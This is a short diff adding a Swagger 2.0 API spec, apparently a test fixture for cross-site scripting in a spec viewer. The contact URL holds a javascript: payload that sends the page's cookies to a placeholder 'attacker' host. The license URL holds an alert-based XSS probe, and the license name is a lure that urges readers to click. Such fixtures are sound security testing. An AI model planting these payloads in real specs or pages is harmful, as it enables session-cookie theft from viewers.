@@ -1,0 +1,18 @@
+{
+  "swagger": "2.0",
+  "info": {
+      "description": "test",
+      "version": "1.0.3",
+      "title": "Swagger",
+      "termsOfService": "http://swagger.io/terms/",
+    "contact" : {
+      "name" : "Wally",
+      "email" : "wallythebest@wally.com",
+      "url": "javascript:window.location='http://attacker/?cookie='+document.cookie"
+    },
+      "license": {
+          "name": "I swear if you click below you will have the most amazing experience ever. I promise.",
+          "url": "javascript:alert(/XSS:/.source+document.domain)"
+      }
+  }
+  } 
